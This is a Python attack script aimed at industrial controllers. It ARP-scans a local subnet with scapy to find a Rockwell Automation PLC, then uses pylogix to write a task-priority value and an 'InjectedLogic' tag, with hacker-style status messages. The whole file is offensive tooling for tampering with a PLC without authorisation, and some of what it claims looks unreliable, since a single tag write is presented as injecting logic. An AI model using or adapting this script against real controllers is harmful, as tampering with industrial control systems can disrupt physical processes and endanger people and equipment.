from pylogix import PLC
from scapy.all import ARP, Ether, srp
import time

# Function to find PLC's IP in the local network
def find_plc_ip():
    target_ip = "192.168.1.0/24"  # Adjust this based on your network range
    arp_request = ARP(pdst=target_ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for sent, received in answered_list:
        if "Rockwell Automation" in received.summary():  # Identifying Rockwell PLC based on MAC vendor
            print(f"[+] Found PLC at IP: {received.psrc}")
            return received.psrc

    print("[-] No PLC found on the network")
    return None

# Function to modify PLC tasking
def modify_plc_tasking(plc_ip):
    comm = PLC()
    comm.IPAddress = plc_ip

    try:
        print(f"[*] Connecting to PLC at {plc_ip}...")
        task_name = "MainTask"  # Default task name, change if necessary
        new_priority = 1  # Higher priority for potential influence

        # Attempt to modify task priority (if supported by the Micro850)
        print("[*] Modifying Task Properties...")
        response = comm.Write(f"{task_name}.Priority", new_priority)

        if response.Status == "Success":
            print("[+] Successfully modified task priority!")
        else:
            print(f"[-] Failed to modify task priority: {response.Status}")

        print("[*] Injecting arbitrary logic for execution...")
        
        # Injecting a simple ladder logic functionality (appending to an existing POU)
        tag_name = "InjectedLogic"
        logic_value = 1  # Simple dummy tag to indicate execution
        response = comm.Write(tag_name, logic_value)

        if response.Status == "Success":
            print(f"[+] Successfully injected code via {tag_name}!")
        else:
            print(f"[-] Failed to inject logic: {response.Status}")

    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        comm.Close()

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    
    if plc_ip:
        modify_plc_tasking(plc_ip)
    else:
        print("[-] Unable to locate PLC, aborting task modification.")